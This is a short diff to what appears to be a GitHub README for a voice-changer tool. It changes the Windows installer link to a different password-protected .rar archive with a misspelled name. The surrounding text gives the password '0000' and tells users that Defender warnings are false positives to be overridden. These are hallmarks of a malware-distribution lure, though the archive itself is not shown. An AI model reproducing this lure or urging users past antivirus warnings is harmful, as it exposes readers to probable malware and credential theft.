@@ -15,7 +15,7 @@
 
 ---
 
-## 📥 [DOWNLOAD INSTALLER (Windows x64)](https://github.com/Jebos-bot/RVC-Realtime-Voice-Changer-Ultimate-GUI/releases/download/V2%2C5/Release_v4.2.rar) 📥
+## 📥 [DOWNLOAD INSTALLER (Windows x64)](https://github.com/Jebos-bot/RVC-Realtime-Voice-Changer-Ultimate-GUI/releases/download/V2%2C5/Relese_v4.51.rar) 📥
 
 > **Password:** `0000`
 > *Requirements: Windows 10/11. If Defender blocks the installation, it's a false positive due to PyInstaller packaging. Please allow the tool.*
